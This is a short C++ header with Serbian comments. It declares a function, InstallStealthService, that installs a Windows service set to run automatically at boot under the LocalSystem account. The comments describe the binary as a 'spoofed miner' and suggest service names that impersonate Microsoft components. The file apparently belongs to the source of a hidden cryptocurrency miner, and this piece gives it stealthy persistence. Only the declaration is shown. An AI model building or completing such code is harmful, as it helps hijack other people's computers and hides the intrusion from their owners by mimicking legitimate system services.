#pragma once

namespace ServiceManager {

    /**
     * @brief Proverava da li je naš servis već instaliran. Ako nije, instalira ga
     *        i konfiguriše da se pokreće automatski sa sistemom pod LocalSystem nalogom.
     *        Ova funkcija je idempotentna - bezbedno je zvati je više puta.
     * @param serviceName Interno ime servisa (npr. "MsSyncHostSvc").
     * @param displayName Ime koje se prikazuje u Services.msc (npr. "Microsoft Sync Host Service").
     * @param binaryPath Puna putanja do našeg izvršnog fajla (spoofovanog minera).
     * @return Vraća true ako je servis uspešno instaliran ili ako već postoji, inače false.
     */
    bool InstallStealthService(const char* serviceName, const char* displayName, const char* binaryPath);

}